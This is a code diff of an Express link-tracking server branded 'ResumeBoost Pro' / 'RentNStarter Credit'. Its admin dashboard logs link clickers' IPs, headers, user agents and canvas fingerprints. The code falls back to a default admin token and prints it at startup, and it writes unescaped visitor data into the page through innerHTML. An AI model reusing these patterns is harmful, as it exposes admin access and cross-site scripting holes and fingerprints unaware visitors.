-                                <div class="detail-value">\${data.canvasFingerprint ? data.canvasFingerprint.substring(0, 20) + '...' : 'Unknown'}</div>
-                            </div>
-                        </div>
-                    </div>
-                \`;
-            }
-            
-            // Network Info
-            html += \`
-                <div class="detail-section">
-                    <h4>🌍 Network Information</h4>
-                    <div class="detail-grid">
-                        <div class="detail-item">
-                            <div class="detail-label">IP Address</div>
-                            <div class="detail-value">\${visitor.ip || 'Unknown'}</div>
-                        </div>
-                        <div class="detail-item">
-                            <div class="detail-label">X-Forwarded-For</div>
-                            <div class="detail-value">\${visitor.xForwardedFor || 'Not provided'}</div>
-                        </div>
-                        <div class="detail-item">
-                            <div class="detail-label">CF-Connecting-IP</div>
-                            <div class="detail-value">\${visitor.cfConnectingIp || 'Not provided'}</div>
-                        </div>
-                        <div class="detail-item">
-                            <div class="detail-label">Request Method</div>
-                            <div class="detail-value">\${visitor.method || 'GET'}</div>
-                        </div>
-                    </div>
-                </div>
-            \`;
-            
-            // Bot Analysis
-            html += \`
-                <div class="detail-section">
-                    <h4>🤖 Bot Analysis</h4>
-                    <div class="detail-grid">
-                        <div class="detail-item">
-                            <div class="detail-label">Bot Detection</div>
-                            <div class="detail-value">\${visitor.isBot ? 'Detected as Bot' : 'Appears Human'}</div>
-                        </div>
-                        <div class="detail-item">
-                            <div class="detail-label">Bot Score</div>
-                            <div class="detail-value">
-                                \${visitor.botScore || 0}%
-                                <div class="progress-bar">
-                                    <div class="progress-fill" style="width: \${visitor.botScore || 0}%"></div>
-                                </div>
-                            </div>
-                        </div>
-                        <div class="detail-item">
-                            <div class="detail-label">Campaign</div>
-                            <div class="detail-value">\${visitor.campaign}</div>
-                        </div>
-                        <div class="detail-item">
-                            <div class="detail-label">Tracking ID</div>
-                            <div class="detail-value">\${visitor.trackingId.substring(0, 8)}...</div>
-                        </div>
-                    </div>
-                </div>
-            \`;
-            
-            return html;
-        }
-        
-        function toggleVisitor(id) {
-            const details = document.getElementById(id);
-            details.classList.toggle('show');
-        }
-        
-        function getTimeDifference(timestamp) {
-            const now = new Date();
-            const then = new Date(timestamp);
-            const diff = now - then;
-            
-            const seconds = Math.floor(diff / 1000);
-            const minutes = Math.floor(seconds / 60);
-            const hours = Math.floor(minutes / 60);
-            const days = Math.floor(hours / 24);
-            
-            if (days > 0) return \`\${days} day\${days > 1 ? 's' : ''} ago\`;
-            if (hours > 0) return \`\${hours} hour\${hours > 1 ? 's' : ''} ago\`;
-            if (minutes > 0) return \`\${minutes} minute\${minutes > 1 ? 's' : ''} ago\`;
-            return \`\${seconds} second\${seconds !== 1 ? 's' : ''} ago\`;
-        }
-        
-        function updateCampaignsList(links) {
-            const container = document.getElementById("campaignsList");
-            
-            if (links.length === 0) {
-                container.innerHTML = '<div class="empty-state"><div class="empty-state-icon">📈</div><p>No campaigns created yet.</p></div>';
-                return;
-            }
-            
-            container.innerHTML = links.map(link => {
-                const humanRate = link.totalClicks > 0 ? 
-                    Math.round((link.humanClicks / link.totalClicks) * 100) : 0;
-                
-                return \`
-                    <div class="visitor-card">
-                        <div class="visitor-header" onclick="toggleCampaign('campaign-\${link.trackingId}')">
-                            <div class="visitor-main-info">
-                                <div class="visitor-timestamp">\${link.description}</div>
-                                <div class="visitor-summary">
-                                    <span style="color: #666;">Campaign: \${link.campaign}</span>
-                                    <span class="ip-badge">ID: \${link.shortId}</span>
-                                    <span style="color: #666;">Created: \${new Date(link.created).toLocaleDateString()}</span>
-                                </div>
-                            </div>
-                            <div style="text-align: right;">
-                                <div style="font-size: 2em; font-weight: bold; color: #667eea;">\${link.totalClicks}</div>
-                                <div style="font-size: 0.9em; color: #666;">Total Clicks</div>
-                            </div>
-                        </div>
-                        <div class="visitor-details" id="campaign-\${link.trackingId}">
-                            <div class="detail-section">
-                                <h4>📊 Campaign Metrics</h4>
-                                <div class="detail-grid">
-                                    <div class="detail-item">
-                                        <div class="detail-label">Total Clicks</div>
-                                        <div class="detail-value">\${link.totalClicks}</div>
-                                    </div>
-                                    <div class="detail-item">
-                                        <div class="detail-label">Unique IPs</div>
-                                        <div class="detail-value">\${link.uniqueIPs}</div>
-                                    </div>
-                                    <div class="detail-item">
-                                        <div class="detail-label">Human Clicks</div>
-                                        <div class="detail-value">\${link.humanClicks} (\${humanRate}%)</div>
-                                    </div>
-                                    <div class="detail-item">
-                                        <div class="detail-label">Bot Clicks</div>
-                                        <div class="detail-value">\${link.botClicks} (\${100 - humanRate}%)</div>
-                                    </div>
-                                </div>
-                            </div>
-                            <div class="detail-section">
-                                <h4>🔗 Campaign URLs</h4>
-                                <div class="detail-grid">
-                                    <div class="detail-item">
-                                        <div class="detail-label">Main URL</div>
-                                        <div class="detail-value" style="color: #667eea;">
-                                            \${link.friendlyPath ? \`/offer/\${link.friendlyPath}\` : \`/t/\${link.trackingId}\`}
-                                        </div>
-                                    </div>
-                                    <div class="detail-item">
-                                        <div class="detail-label">Short URL</div>
-                                        <div class="detail-value" style="color: #667eea;">
-                                            /s/\${link.shortId}
-                                        </div>
-                                    </div>
-                                </div>
-                            </div>
-                        </div>
-                    </div>
-                \`;
-            }).join('');
-        }
-        
-        function toggleCampaign(id) {
-            const details = document.getElementById(id);
-            details.classList.toggle('show');
-        }
-        
-        function showTab(tabElement, tabName) {
-            // Update active tab
-            document.querySelectorAll('.tab').forEach(tab => tab.classList.remove('active'));
-            tabElement.classList.add('active');
-            
-            // Show/hide tab content
-            document.getElementById('visitorsTab').classList.toggle('hidden', tabName !== 'visitors');
-            document.getElementById('campaignsTab').classList.toggle('hidden', tabName !== 'campaigns');
-            document.getElementById('createTab').classList.toggle('hidden', tabName !== 'create');
-            
-            // Refresh data when switching to visitors or campaigns tab
-            if ((tabName === 'visitors' || tabName === 'campaigns') && token) {
-                refreshData();
-            }
-        }
-        
-        function createLink() {
-            const desc = document.getElementById('description').value;
-            const camp = document.getElementById('campaign').value;
-            const urlType = document.getElementById('urlType').value;
-            const customPath = document.getElementById('customPath').value;
-            
-            if (!desc || !camp) {
-                alert('Please fill in both description and campaign name');
-                return;
-            }
-            
-            fetch('/api/create-link', {
-                method: 'POST',
-                headers: {
-                    'Authorization': 'Bearer ' + token,
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({
-                    description: desc,
-                    campaign: camp,
-                    urlType: urlType,
-                    customPath: customPath
-                })
-            })
-            .then(r => r.json())
-            .then(data => {
-                if (data.success) {
-                    document.getElementById('result').innerHTML = \`
-                        <div style="background: #d1fae5; border: 2px solid #6ee7b7; padding: 20px; border-radius: 8px;">
-                            <strong style="color: #065f46; font-size: 1.1em;">✅ Campaign link created successfully!</strong>
-                            <div style="margin-top: 15px; display: grid; gap: 10px;">
-                                <div>
-                                    <div style="font-weight: 600; color: #065f46; margin-bottom: 4px;">Main URL:</div>
-                                    <div style="font-family: monospace; background: white; padding: 10px; border-radius: 4px; word-break: break-all;">
-                                        \${data.url}
-                                    </div>
-                                </div>
-                                <div>
-                                    <div style="font-weight: 600; color: #065f46; margin-bottom: 4px;">Short URL:</div>
-                                    <div style="font-family: monospace; background: white; padding: 10px; border-radius: 4px; word-break: break-all;">
-                                        \${data.shortUrl}
-                                    </div>
-                                </div>
-                                <button onclick="copyToClipboard('\${data.url}')" style="background: #065f46; margin-top: 10px;">
-                                    📋 Copy Main URL
-                                </button>
-                            </div>
-                        </div>
-                    \`;
-                    
-                    // Clear form
-                    document.getElementById('description').value = '';
-                    document.getElementById('campaign').value = '';
-                    document.getElementById('customPath').value = '';
-                    
-                    // Refresh data after 1 second
-                    setTimeout(refreshData, 1000);
-                } else {
-                    document.getElementById('result').innerHTML = \`
-                        <div style="background: #fee2e2; border: 2px solid #fca5a5; padding: 20px; border-radius: 8px;">
-                            <strong style="color: #dc2626;">❌ Error: \${data.error || 'Failed to create link'}</strong>
-                        </div>
-                    \`;
-                }
-            })
-            .catch(e => {
-                document.getElementById('result').innerHTML = \`
-                    <div style="background: #fee2e2; border: 2px solid #fca5a5; padding: 20px; border-radius: 8px;">
-                        <strong style="color: #dc2626;">❌ Error: \${e}</strong>
-                    </div>
-                \`;
-            });
-        }
-        
-        function copyToClipboard(text) {
-            navigator.clipboard.writeText(text).then(() => {
-                alert('URL copied to clipboard!');
-            }).catch(() => {
-                // Fallback for older browsers
-                const textArea = document.createElement('textarea');
-                textArea.value = text;
-                document.body.appendChild(textArea);
-                textArea.select();
-                document.execCommand('copy');
-                document.body.removeChild(textArea);
-                alert('URL copied to clipboard!');
-            });
-        }
-        
-        // Auto-focus on password field
-        document.addEventListener('DOMContentLoaded', () => {
-            document.getElementById('token').focus();
-        });
-    </script>
-</body>
-</html>`);
-});
-
-// Short URL endpoint
-app.get('/s/:shortId', (req, res) => {
-    const shortId = req.params.shortId;
-    let foundId = null;
-    
-    // Find full tracking ID from short ID
-    for (const [trackingId, data] of trackingData.entries()) {
-        if (trackingId.startsWith(shortId)) {
-            foundId = trackingId;
-            break;
-        }
-    }
-    
-    if (foundId) {
-        handleTracking(req, res, foundId);
-    } else {
-        res.status(404).send('Link not found');
-    }
+    res.send('<!DOCTYPE html><html><head><title>ResumeBoost Pro - Analytics Dashboard</title><style>body { font-family: Arial, sans-serif; margin: 0; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); min-height: 100vh; } .container { max-width: 1200px; margin: 0 auto; background: white; margin: 20px; border-radius: 10px; box-shadow: 0 20px 60px rgba(0,0,0,0.1); padding: 30px; } h1 { color: #667eea; text-align: center; margin-bottom: 10px; } .auth { margin: 20px 0; padding: 20px; background: #f8f9ff; border-radius: 10px; border: 2px solid #e0e6ff; } input, select { width: 100%; padding: 12px; margin: 10px 0; border: 2px solid #e0e6ff; border-radius: 8px; box-sizing: border-box; } button { background: #667eea; color: white; padding: 12px 24px; border: none; border-radius: 8px; cursor: pointer; font-weight: 600; } .hidden { display: none; } .stats { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px; margin: 20px 0; } .stat { background: linear-gradient(135deg, #667eea, #764ba2); color: white; padding: 20px; border-radius: 10px; text-align: center; } .stat h3 { margin: 0; font-size: 2.5em; } .error { color: #ef4444; } .success { color: #10b981; } .tabs { display: flex; border-bottom: 2px solid #e0e6ff; margin: 20px 0; } .tab { padding: 10px 20px; cursor: pointer; border-bottom: 2px solid transparent; } .tab.active { border-bottom-color: #667eea; color: #667eea; font-weight: bold; } .tab:hover { background: #f8f9ff; } .campaign-card { background: #fff; border: 2px solid #e0e6ff; border-radius: 10px; margin: 15px 0; overflow: hidden; } .campaign-header { background: #f8f9ff; padding: 15px; border-bottom: 1px solid #e0e6ff; cursor: pointer; } .campaign-header:hover { background: #f0f4ff; } .campaign-title { font-weight: bold; color: #667eea; font-size: 1.1em; } .campaign-details { padding: 20px; display: none; background: #fafafa; } .campaign-details.show { display: block; } .visitor-table { width: 100%; border-collapse: collapse; margin: 15px 0; font-size: 0.9em; } .visitor-table th, .visitor-table td { padding: 8px; text-align: left; border-bottom: 1px solid #ddd; } .visitor-table th { background: #667eea; color: white; } .visitor-table tr:hover { background: #f5f5f5; } .bot-badge { padding: 2px 6px; border-radius: 4px; font-size: 0.8em; font-weight: bold; } .bot-badge.bot { background: #fef2f2; color: #dc2626; } .bot-badge.human { background: #f0fdf4; color: #059669; } .ip-address { font-family: monospace; color: #667eea; } .user-agent { font-family: monospace; font-size: 0.8em; max-width: 200px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }</style></head><body><div class="container"><h1>📊 ResumeBoost Pro</h1><p style="text-align: center; color: #666;">Analytics Dashboard - Detailed Campaign Analytics</p><div class="auth"><h3>🔐 Authentication Required</h3><input type="password" id="token" placeholder="Enter admin token"><button onclick="authenticate()">Connect to Dashboard</button><button onclick="refreshData()" id="refreshBtn" style="margin-left: 10px; background: #10b981; display: none;">Refresh</button><div id="status"></div></div><div id="dashboard" class="hidden"><div class="stats"><div class="stat"><h3 id="totalLinks">0</h3><p>Campaign Links</p></div><div class="stat"><h3 id="totalClicks">0</h3><p>Total Visits</p></div><div class="stat"><h3 id="totalBots">0</h3><p>Bot Detections</p></div><div class="stat"><h3 id="botPercentage">0%</h3><p>Bot Rate</p></div></div><div class="tabs"><div class="tab active" onclick="showTab(this, \\"create\\")">🔗 Create Campaign</div><div class="tab" onclick="showTab(this, \\"analytics\\")">📈 Campaign Analytics</div></div><div id="createTab"><div style="background: #f8f9ff; padding: 20px; border-radius: 10px; margin: 20px 0;"><h3>🔗 Create New Campaign Link</h3><input type="text" id="description" placeholder="Campaign description (e.g., Email Newsletter)"><input type="text" id="campaign" placeholder="Campaign name (e.g., Q1-2024)"><select id="urlType"><option value="friendly">Friendly URL</option><option value="promo">Promo Code</option><option value="company">Company Application</option><option value="tool">Tool URL</option></select><input type="text" id="customPath" placeholder="Custom path (optional)"><button onclick="createLink()">Generate Tracking Link</button><div id="result"></div></div></div><div id="analyticsTab" class="hidden"><h3>📊 Campaign Analytics & Visitor Details</h3><div id="campaignsList">Loading campaigns...</div></div></div></div><script>let token = ""; let dashboardData = {}; function authenticate() { token = document.getElementById("token").value; fetch("/api/dashboard", { headers: { "Authorization": "Bearer " + token } }).then(r => r.ok ? r.json() : Promise.reject("Invalid token")).then(data => { document.getElementById("status").innerHTML = "<span class=\\"success\\">✅ Connected!</span>"; document.getElementById("dashboard").classList.remove("hidden"); document.getElementById("refreshBtn").style.display = "inline-block"; updateDashboard(data); }).catch(e => document.getElementById("status").innerHTML = "<span class=\\"error\\">❌ " + e + "</span>"); } function refreshData() { if (!token) return; fetch("/api/dashboard", { headers: { "Authorization": "Bearer " + token } }).then(r => r.json()).then(data => updateDashboard(data)); } function updateDashboard(data) { dashboardData = data; document.getElementById("totalLinks").textContent = data.totalLinks; document.getElementById("totalClicks").textContent = data.totalClicks; document.getElementById("totalBots").textContent = data.totalBots; document.getElementById("botPercentage").textContent = data.botPercentage + "%"; updateCampaignsList(data.links); } function updateCampaignsList(links) { const container = document.getElementById("campaignsList"); if (links.length === 0) { container.innerHTML = "<p style=\\"text-align: center; color: #666; padding: 20px;\\">No campaigns created yet.</p>"; return; } container.innerHTML = links.map(link => { return "<div class=\\"campaign-card\\"><div class=\\"campaign-header\\" onclick=\\"toggleCampaign(\'" + link.trackingId + "\')\\\"><div class=\\"campaign-title\\">" + link.description + "</div><div style=\\"color: #666; font-size: 0.9em; margin-top: 5px;\\">Campaign: " + link.campaign + " • Created: " + new Date(link.created).toLocaleDateString() + " • ID: " + link.shortId + "</div><div style=\\"display: grid; grid-template-columns: repeat(auto-fit, minmax(100px, 1fr)); gap: 10px; margin-top: 10px;\\"><div style=\\"background: #e8f0ff; padding: 8px; border-radius: 5px; text-align: center;\\"><div style=\\"font-weight: bold; color: #667eea;\\">" + link.totalClicks + "</div><div style=\\"font-size: 0.8em;\\">Total Clicks</div></div><div style=\\"background: #e8f0ff; padding: 8px; border-radius: 5px; text-align: center;\\"><div style=\\"font-weight: bold; color: #667eea;\\">" + link.uniqueIPs + "</div><div style=\\"font-size: 0.8em;\\">Unique IPs</div></div><div style=\\"background: #e8f0ff; padding: 8px; border-radius: 5px; text-align: center;\\"><div style=\\"font-weight: bold; color: #667eea;\\">" + link.humanClicks + "</div><div style=\\"font-size: 0.8em;\\">Human Clicks</div></div><div style=\\"background: #e8f0ff; padding: 8px; border-radius: 5px; text-align: center;\\"><div style=\\"font-weight: bold; color: #667eea;\\">" + link.botClicks + "</div><div style=\\"font-size: 0.8em;\\">Bot Clicks</div></div></div></div><div class=\\"campaign-details\\" id=\\"details-" + link.trackingId + "\\"><div id=\\"clicks-" + link.trackingId + "\\">Loading detailed analytics...</div></div></div>"; }).join(""); } function toggleCampaign(trackingId) { const details = document.getElementById("details-" + trackingId); const clicksContainer = document.getElementById("clicks-" + trackingId); if (details.classList.contains("show")) { details.classList.remove("show"); } else { details.classList.add("show"); loadCampaignDetails(trackingId, clicksContainer); } } function loadCampaignDetails(trackingId, container) { console.log("Loading details for:", trackingId); container.innerHTML = "<p>Loading visitor details...</p>"; fetch("/api/stats/" + trackingId, { headers: { "Authorization": "Bearer " + token } }).then(r => { console.log("Response status:", r.status); if (!r.ok) { throw new Error("HTTP " + r.status + ": " + r.statusText); } return r.json(); }).then(data => { console.log("Received data:", data); const clicks = data.recentClicks || []; if (clicks.length === 0) { container.innerHTML = "<div style=\\"text-align: center; padding: 20px; background: #f8f9ff; border-radius: 8px; margin: 10px 0;\\"><h4>📭 No Visitors Yet</h4><p style=\\"color: #666;\\">This campaign hasn\\'t received any clicks yet.<br>Share the tracking link to start collecting data!</p><p style=\\"font-family: monospace; font-size: 0.9em; color: #667eea;\\">Campaign ID: " + trackingId.substring(0, 8) + "</p></div>"; return; } const clicksTable = "<div style=\\"margin: 15px 0;\\"><h4 style=\\"color: #667eea; margin-bottom: 15px;\\">📋 Visitor Log (" + clicks.length + " recent visits)</h4><div style=\\"overflow-x: auto;\\"><table class=\\"visitor-table\\"><thead><tr><th>Date & Time</th><th>IP Address</th><th>User Agent</th><th>Location Info</th><th>Bot Detection</th><th>Bot Score</th><th>Type</th></tr></thead><tbody>" + clicks.map(click => { const date = new Date(click.timestamp); const timeStr = date.toLocaleDateString() + "<br><small>" + date.toLocaleTimeString() + "</small>"; const userAgentShort = click.userAgent.length > 50 ? click.userAgent.substring(0, 50) + "..." : click.userAgent; return "<tr><td>" + timeStr + "</td><td class=\\"ip-address\\">" + click.ip + "</td><td class=\\"user-agent\\" title=\\"" + click.userAgent + "\\">" + userAgentShort + "</td><td><strong>" + (click.acceptLanguage || "Unknown") + "</strong><br><small style=\\"color: #666;\\">" + (click.referer !== "Direct" ? "Ref: " + click.referer : "Direct access") + "</small></td><td><span class=\\"bot-badge " + (click.isBot ? "bot" : "human") + "\\">" + (click.isBot ? "🤖 Bot" : "👤 Human") + "</span></td><td><strong style=\\"color: " + (click.botScore > 50 ? "#dc2626" : "#059669") + ";\\">" + (click.botScore || 0) + "%</strong></td><td>" + (click.type === "javascript" ? "📱 JS" : "🌐 Page") + "</td></tr>"; }).join("") + "</tbody></table></div></div>"; const userAgentsSection = data.topUserAgents && data.topUserAgents.length > 0 ? "<div style=\\"margin: 20px 0;\\"><h4 style=\\"color: #667eea; margin-bottom: 15px;\\">📊 Top User Agents</h4><div style=\\"background: #f8f9ff; padding: 15px; border-radius: 8px; border: 1px solid #e0e6ff;\\">" + data.topUserAgents.map(ua => "<div style=\\"display: flex; justify-content: space-between; align-items: center; margin: 8px 0; padding: 5px; background: white; border-radius: 4px;\\"><span style=\\"font-family: monospace; font-size: 0.85em; color: #333; flex: 1;\\">" + ua.userAgent + "</span><span style=\\"font-weight: bold; color: #667eea; margin-left: 10px;\\">" + ua.count + " visits</span></div>").join("") + "</div></div>" : ""; const summarySection = "<div style=\\"background: #e8f0ff; padding: 15px; border-radius: 8px; margin: 15px 0; border-left: 4px solid #667eea;\\"><h4 style=\\"margin: 0 0 10px 0; color: #667eea;\\">📈 Campaign Summary</h4><div style=\\"display: grid; grid-template-columns: repeat(auto-fit, minmax(120px, 1fr)); gap: 15px;\\"><div><strong>Total Visits:</strong><br><span style=\\"font-size: 1.2em; color: #667eea;\\">" + data.totalClicks + "</span></div><div><strong>Unique IPs:</strong><br><span style=\\"font-size: 1.2em; color: #667eea;\\">" + data.uniqueIPs + "</span></div><div><strong>Human Visits:</strong><br><span style=\\"font-size: 1.2em; color: #059669;\\">" + data.humanClicks + "</span></div><div><strong>Bot Visits:</strong><br><span style=\\"font-size: 1.2em; color: #dc2626;\\">" + data.botClicks + "</span></div><div><strong>Avg Bot Score:</strong><br><span style=\\"font-size: 1.2em; color: " + (data.avgBotScore > 50 ? "#dc2626" : "#059669") + ";\\">" + data.avgBotScore + "%</span></div></div></div>"; container.innerHTML = summarySection + clicksTable + userAgentsSection; }).catch(e => { console.error("Error loading campaign details:", e); container.innerHTML = "<div style=\\"color: #ef4444; background: #fef2f2; padding: 15px; border-radius: 8px; margin: 10px 0;\\"><h4>❌ Error Loading Details</h4><p>Failed to load visitor details: " + e.message + "</p><p><strong>Tracking ID:</strong> " + trackingId + "</p><button onclick=\\"loadCampaignDetails(\\'" + trackingId + "\\', document.getElementById(\\'clicks-" + trackingId + "\\'));\\" style=\\"background: #667eea; color: white; border: none; padding: 8px 16px; border-radius: 4px; cursor: pointer; margin-top: 10px;\\">🔄 Retry</button></div>"; }); } function showTab(tabElement, tabName) { document.querySelectorAll(".tab").forEach(tab => tab.classList.remove("active")); tabElement.classList.add("active"); document.getElementById("createTab").classList.toggle("hidden", tabName !== "create"); document.getElementById("analyticsTab").classList.toggle("hidden", tabName !== "analytics"); if (tabName === "analytics" && token) { refreshData(); } } function createLink() { const desc = document.getElementById("description").value; const camp = document.getElementById("campaign").value; const urlType = document.getElementById("urlType").value; const customPath = document.getElementById("customPath").value; fetch("/api/create-link", { method: "POST", headers: { "Authorization": "Bearer " + token, "Content-Type": "application/json" }, body: JSON.stringify({ description: desc, campaign: camp, urlType: urlType, customPath: customPath }) }).then(r => r.json()).then(data => { if (data.success) { document.getElementById("result").innerHTML = "<div style=\\"background: #e8f0ff; padding: 15px; border-radius: 8px; margin: 10px 0;\\"><strong>✅ Campaign link created!</strong><br><strong>Main URL:</strong> <span style=\\"font-family: monospace; color: #667eea; word-break: break-all;\\">" + data.url + "</span><br><strong>Short URL:</strong> <span style=\\"font-family: monospace; color: #667eea; word-break: break-all;\\">" + data.shortUrl + "</span></div>"; document.getElementById("description").value = ""; document.getElementById("campaign").value = ""; document.getElementById("customPath").value = ""; setTimeout(refreshData, 1000); } }); } setInterval(() => { if (token && !document.getElementById("analyticsTab").classList.contains("hidden")) { refreshData(); } }, 30000);</script></body></html>');
 });
 
 // Error handling
@@ -1678,25 +527,15 @@ app.use((req, res) => {
 // Graceful shutdown
 process.on('SIGTERM', () => {
     console.log('Saving data before shutdown...');
-    saveData();
-    process.exit(0);
-});
-
-process.on('SIGINT', () => {
-    console.log('Saving data before shutdown...');
-    saveData();
+    const dataObj = Object.fromEntries(trackingData);
+    fs.writeFileSync(DATA_FILE, JSON.stringify(dataObj, null, 2));
     process.exit(0);
 });
 
 app.listen(PORT, () => {
-    console.log('🚀 ResumeBoost Pro running on port ' + PORT);
-    console.log('🌐 Available at: https://rentnstarter.up.railway.app');
-    console.log('📊 Dashboard: https://rentnstarter.up.railway.app/dashboard');
-    
-    const configuredToken = process.env.ADMIN_TOKEN || 'admin-secret-token';
-    console.log('🔐 Admin token configured: ' + (process.env.ADMIN_TOKEN ? 'Using environment variable' : 'Using default (admin-secret-token)'));
-    console.log('📝 Total tracking links: ' + trackingData.size);
-    
-    // Log the actual token for debugging (remove in production)
-    console.log('🔑 Current admin token: ' + configuredToken);
+    console.log('RentNStarter Credit running on port ' + PORT);
+    console.log('Available at: https://rentnstarter.up.railway.app');
+    console.log('Dashboard: https://rentnstarter.up.railway.app/dashboard');
+    console.log('Admin token: ' + (process.env.ADMIN_TOKEN || 'admin-secret-token'));
+    console.log('Total tracking links: ' + trackingData.size);
 });
